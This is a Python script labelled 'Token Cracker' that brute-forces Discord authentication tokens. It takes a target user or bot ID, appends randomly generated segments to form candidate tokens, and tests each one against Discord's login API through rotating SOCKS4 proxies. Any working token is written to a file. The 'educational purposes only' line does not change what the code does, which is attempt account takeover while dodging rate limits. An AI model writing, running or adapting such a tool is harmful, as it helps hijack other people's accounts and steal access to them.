import base64
import os
import random
import string
import requests
import colorama
from colorama import *
import time
import console
from console.utils import set_title
import json
"""
with open("config.json", "r") as f:
    data = f.read()
    print(data)
"""
config = {"cracker_mode": "user","proxy_timeout": "6000","proxy_file_path": "./proxy/socks4.txt"}

try:
    if os.stat("config.json").st_size == 0:
        with open("config.json", "w") as f:
            json.dump(config, f, indent=2)
        print("Successfully Wrote the config!")
except:
    with open("config.json", "a+") as f:
        json.dump(config, f, indent=2)
    print("Successfully Wrote the config!")


with open("config.json", "r") as config_file:
    data = json.load(config_file)

vaild = 0
invaild = 0
total_proxy = 0
bad_proxy = 0

userid = base64.b64encode((input("User / Bot ID: ")).encode("ascii"))
userid = str(userid)[2:-1]
print("WARNING: Educational purposes only!")

proxies = set()
with open(data["proxy_file_path"], "r") as file:
    fline = file.readlines()
    for line in fline:
        proxies.add(line.strip())

ts = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890-_"


while userid == userid:
    total_proxy = len(list(proxies))
    set_title(f"Token Cracker - Vaild: {vaild} | Invaild: {invaild} | Total Proxies: {total_proxy} | Bad Proxy: {bad_proxy}")
    def HMAC(chars = string.ascii_uppercase + string.digits, N=27):
        return ''.join(random.choice(chars) for _ in range(N))

    def timest(chars = string.ascii_uppercase + string.digits, N=random.randint(4, 6)):
        return ''.join(random.choice(chars) for _ in range(N))

    token = userid + '.' + timest(chars=ts) + '.' + HMAC(chars=ts)

    if data["cracker_mode"].casefold() == "user".casefold():
        checkerheaders = {'Authorization': token}
    elif data["cracker_mode"].casefold() == "bot".casefold():
        checkerheaders = {'Authorization': f'Bot {token}'}
    else:
        print(Fore.RED + "Invaild Mode!")
        break
    
    proxy = random.choice(list(proxies))
    proxy_form = {'http': f"socks4://{proxy}", 'https': f"socks4://{proxy}"}

    try:
        login = requests.get('https://discordapp.com/api/v9/auth/login', headers=checkerheaders, proxies=proxy_form, timeout=int(data["proxy_timeout"]))
        if login.status_code == 200:
            print(Fore.GREEN + '[+] VALID' + ' ' + token)
            f = open('done.txt', "a+")
            f.write(f'{token}\n')
            vaild += 1
            break
        else:
            print(Fore.RED + '[-] INVALID' + ' ' + token)
            invaild += 1
    except:
        print(Fore.YELLOW + f'[-] BAD PROXY: {proxy}')
        bad_proxy += 1
